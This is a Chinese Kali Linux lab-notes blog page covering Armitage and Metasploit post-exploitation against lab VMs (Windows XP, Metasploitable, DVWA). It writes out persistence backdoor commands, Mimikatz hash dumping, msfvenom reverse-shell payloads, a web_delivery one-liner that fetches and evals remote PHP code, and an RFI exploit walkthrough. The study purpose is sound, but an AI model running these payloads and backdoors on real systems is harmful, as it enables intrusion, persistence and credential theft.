<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;2&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89)%EF%BC%9AArmitage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89)%EF%BC%9AArmitage/" itemprop="url">Kali Linux笔记(一百一十三)：Armitage</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:45:28+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  673 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Armitage图形化前端"><a href="#1-Armitage图形化前端" class="headerlink" title="1. Armitage图形化前端"></a>1. Armitage图形化前端</h4><ul>
<li>开源免费图形前端<ul>
<li>基于JAVA开发的界面</li>
<li>作者自称是众多不会使用metasploit的安全专家之一（命令行）</li>
<li>MSF基于命令行，缺少直观的GUI图形用户接口</li>
</ul>
</li>
<li>Armitage只是调用MSF的漏洞利用能力<ul>
<li>Armitage的每一个GUI操作都可以对应对应MSF中一条命令</li>
</ul>
</li>
<li>红队团队合作模拟对抗<ul>
<li>分为客户端（armitage）和服务器（msfrpcd）两部分</li>
<li>/usr/share/armitage/teamserver ip password</li>
<li>▲ 允许多个客户端连接一个服务器，监听55553</li>
</ul>
</li>
<li>可脚本化</li>
<li>启动方式<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li>Teamserver<ul>
<li>服务端：<strong><code>🔺命令：./teamserver 服务器IP 连接密码</code></strong></li>
<li>客户端：<strong><code>🔺命令：armitage</code></strong></li>
</ul>
</li>
<li>单机启动<br>  -<strong><code>🔺命令：Armitage</code></strong> <ul>
<li>GUI启动</li>
<li>127.0.0.1 55553</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Armitage"><a href="#2-实验–Armitage" class="headerlink" title="2. 实验–Armitage"></a>2. 实验–Armitage</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>单机使用：点击Armitage的图标（127.0.0.1 / 55553）</li>
<li>界面使用</li>
<li><strong><code>🔺命令：cd /usr/share/armitage</code></strong></li>
<li><strong><code>🔺命令：./teamserver Kali的IP pass123</code></strong></li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Tom）</li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Jan）</li>
</ul>
</li>
</ul>
<h4 id="3-Armitage图形化前端"><a href="#3-Armitage图形化前端" class="headerlink" title="3. Armitage图形化前端"></a>3. Armitage图形化前端</h4><ul>
<li>发现主机（顶栏 → Hosts）<ul>
<li>Add Hosts：手动添加IP地址</li>
<li>Import Hosts：扫描结果导入XML文件（nmap、nessus openvas、appscan、nexpose、awvs）</li>
<li>NMAP Scan/MSF Scan：直接扫描发现（nmap、msf）</li>
<li>DNS Enumerate：DNS枚举发现</li>
</ul>
</li>
<li>扫描端口及服务</li>
<li>工作区workspace<ul>
<li>个人视角的目标动态显示筛选，同一team的队员自定义工作区</li>
<li>基于地址的工作区划分</li>
<li>基于端口的工作区划分</li>
<li>基于操作系统的工作区划分</li>
<li>基于标签的工作区划分</li>
</ul>
</li>
<li>生成Payload<ul>
<li>reverse_tcp</li>
<li>bind_hidden_tcp（只有在AHOST主动连接时，才监听4444端口）</li>
<li>bind_tcp</li>
</ul>
</li>
<li>主动获取目标<ul>
<li>ms08_067</li>
</ul>
</li>
<li>被动获得目标<ul>
<li>Browser_autopwn2（伪造网站进行被动攻击）</li>
</ul>
</li>
<li>Meterpreter shell 能力展示<ul>
<li>空密码：aa63…. / 316c</li>
<li>Poviting → ARP Scan（层级结构）</li>
</ul>
</li>
<li>菜单功能<ul>
<li>SOCKS4（用Kali做跳板机，通过建立的meterpreter隧道进行内网漫游）</li>
<li>Script（可添加script脚本，比如Cortana脚本）</li>
</ul>
</li>
<li>Cortana脚本<ul>
<li>Veil-Evasionғ/use/share/veil-evasion/tools/cortana/veil_evasion.cna </li>
<li><a href="https://github.com/rsmudge/cortana-scripts" target="_blank" rel="noopener">https://github.com/rsmudge/cortana-scripts</a></li>
</ul>
</li>
<li>别无他法的的最后选择<ul>
<li>Attacks<ul>
<li>Find Attacks   # 自动分析匹配漏洞利用模块（智能分析分配模块的尝试）</li>
<li>Hail Mary #上帝啊！赐于我力量吧！（端口进行所有模块的尝试，Great级别以上）</li>
<li>洪水式漏洞利用代码执行，流量及特征明显，容易被发现</li>
</ul>
</li>
</ul>
</li>
<li>Armitage现状<ul>
<li>维护不及时，传言此项目已荒废</li>
<li>仍然式目前唯一开源免费的metasploit图形前端</li>
</ul>
</li>
<li>Cobalt Strike</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/" itemprop="url">Kali Linux笔记(一百一十二)：MSF延展用法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:42:32+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-MSF延展用法–Meterpreter后门"><a href="#1-MSF延展用法–Meterpreter后门" class="headerlink" title="1. MSF延展用法–Meterpreter后门"></a>1. MSF延展用法–Meterpreter后门</h4><ul>
<li>持久后门<ul>
<li>利用漏洞取得的meterpreter shell运行于内存，重启失效</li>
<li>重复exploit漏洞可能造成服务崩溃</li>
<li>持久后门保证漏洞修复后仍可远程控制</li>
</ul>
</li>
<li>Meterpreter后门–metsvc<ul>
<li>▲ metsvc不能改端口，不支持身份验证</li>
<li><strong><code>🔺命令：run metsvc -h</code></strong> <ul>
<li>-A：自动启动/exploit/multi/handle监听</li>
<li>-r：删除监听</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong>  </li>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong>  <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong>  </li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST 1.1.1.1</code></strong> </li>
</ul>
</li>
<li>Meterpreter后门–persistence<ul>
<li>▲ 添加VBS脚本，并在注册表添加启动项</li>
<li><strong><code>🔺命令：run persistence -h</code></strong> <ul>
<li>默认使用windows/meterprter/reverse_tcp</li>
<li>-X：自动启动agent当机器开机</li>
<li>-r：要连接的IP</li>
<li>-p：要连接的端口</li>
</ul>
</li>
<li><strong><code>🔺命令：run persistence -X -i 10 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -U -i 20 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -S -i 20 -p 4444 -r 1.1.1.1</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="2-MSF延展用法–Mimikatz"><a href="#2-MSF延展用法–Mimikatz" class="headerlink" title="2. MSF延展用法–Mimikatz"></a>2. MSF延展用法–Mimikatz</h4><ul>
<li>hashdump使用的就是Minikatz的部分功能<ul>
<li><strong><code>🔺命令：getsystem</code></strong>  </li>
<li><strong><code>🔺命令：load mimikatz</code></strong>  </li>
<li>wdigest、kerberos、msv、ssp、tspkg、livessp<ul>
<li>msv：账号加密信息</li>
<li>ssp：账号不加密信息</li>
<li>tspkg：kerveros身份票据信息</li>
<li>wdigest：从内存中获取账号明文密码</li>
<li>kerboros：从内存中获取账号明文密码</li>
</ul>
</li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong>  <ul>
<li>-a：使用具体模块所需要的子参数</li>
<li>-f：使用的模块</li>
</ul>
</li>
<li>查看模块（使用不存在模块，报错显示）：<strong><code>🔺命令：mimikatz_command -f a::</code></strong>  </li>
<li>查看系统账号哈希：<strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong></li>
<li>查看操作系统进程：<strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li>查看操作系统服务：<strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li>查看操作系统支持的加密：<strong><code>🔺命令：mimikatz_command -fcrypto::listProviders</code></strong> </li>
<li>查看地雷雷数：<strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong><ul>
<li>▲ winmine：扫雷游戏</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-MSF延展用法–PHP-shel-Web-Delivery"><a href="#3-MSF延展用法–PHP-shel-Web-Delivery" class="headerlink" title="3. MSF延展用法–PHP shel/Web Delivery"></a>3. MSF延展用法–PHP shel/Web Delivery</h4><ul>
<li>PHP shell<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></strong></li>
<li>MSF启动侦听</li>
<li>上传到web站点并通过浏览器访问<ul>
<li>Web Delivery</li>
<li>利用代码执行漏洞访问攻击者服务器，从攻击者服务器下载远程执行代码，执行下载的代码后反弹一个shell给攻击者的服务器</li>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong> </li>
<li><strong><code>🔺命令：set target 1</code></strong> </li>
<li><strong><code>🔺命令：;php -d allow_url_fopen=true -r “eval(file_get_contents(‘http://1.1.1.1/ fTYWqmu&#39;));&quot;</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-MSF延展用法–RFI远程文件包含"><a href="#4-MSF延展用法–RFI远程文件包含" class="headerlink" title="4. MSF延展用法–RFI远程文件包含"></a>4. MSF延展用法–RFI远程文件包含</h4><ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On </li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> </li>
<li><strong><code>🔺命令：set RHOST 1.1.1.2</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set lhost 1.1.1.1 – exploit</code></strong></li>
</ul>
<h4 id="5-实验准备"><a href="#5-实验准备" class="headerlink" title="5. 实验准备"></a>5. 实验准备</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Window XP的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：jobs</code></strong><ul>
<li>查看job是否一直有任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
<li>执行a.exe</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
<li>Metasploit<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
<h4 id="6-实验–metsvc"><a href="#6-实验–metsvc" class="headerlink" title="6. 实验–metsvc"></a>6. 实验–metsvc</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run metsvc -h</code></strong></li>
<li><strong><code>🔺命令：run metsvc -A</code></strong>（31337）</li>
<li>查看是否拿到shell</li>
<li>在window 7的计算机管理查看是否开启服务meterpreter → metsvc</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
</li>
</ul>
<h4 id="7-实验–persistence"><a href="#7-实验–persistence" class="headerlink" title="7. 实验–persistence"></a>7. 实验–persistence</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run persistence -h</code></strong></li>
<li><strong><code>🔺命令：run persistence -X -p 4444 -r Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：background</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterprter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong><ul>
<li><strong><code>🔺命令：set exitonsession false</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>重新启动</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
<h4 id="8-实验–Mimikatz"><a href="#8-实验–Mimikatz" class="headerlink" title="8. 实验–Mimikatz"></a>8. 实验–Mimikatz</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：load mimikatz</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f a::</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f crypto::listProviders</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong></li>
</ul>
</li>
</ul>
<h4 id="9-实验–PHP-shell"><a href="#9-实验–PHP-shell" class="headerlink" title="9. 实验–PHP shell"></a>9. 实验–PHP shell</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=3333 -f raw -o a.php</code></strong> </li>
<li><strong><code>🔺命令：scp a.php msfadmin@Metasploit的IP:/home/msfadmin</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 3333</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：sudo cp a.php /var/www</code></strong></li>
<li><strong><code>🔺命令：ls /var/www</code></strong>（查看是否已经复制）</li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/a.php" target="_blank" rel="noopener">http://Metasploit的IP/a.php</a></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-实验–Web-Delivery"><a href="#10-实验–Web-Delivery" class="headerlink" title="10. 实验–Web Delivery"></a>10. 实验–Web Delivery</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong><ul>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：set target 1</code></strong>（PHP）</li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>浏览器访问<a href="http://Metasploit的IP，访问DVWA" target="_blank" rel="noopener">http://Metasploit的IP，访问DVWA</a></li>
<li>设置安全级别为低</li>
<li>在Cmomand Exection中执行生成的命令行<strong><code>🔺命令：;php -d allow url fopen=true -r &quot;eval(file get contents(&#39;http://Kali的IP:8080/&#39;));&quot;</code></strong></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-实验–RFI远程文件包含"><a href="#11-实验–RFI远程文件包含" class="headerlink" title="11. 实验–RFI远程文件包含"></a>11. 实验–RFI远程文件包含</h4><ul>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试" target="_blank" rel="noopener">http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试</a></li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On</li>
</ul>
</li>
<li><strong><code>🔺命令：sudo /etc/init.d apache2 restart</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php" target="_blank" rel="noopener">http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php</a> ，远程文件包含测试</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set lhost Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看是否能直接拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li>▲ 2020.03.04 Exploit completed,but no session was created</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Post/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Post/" itemprop="url">Kali Linux笔记(一百一十一)：MSF模块--Posting</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:40:08+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  643 字
                </span>
              

              
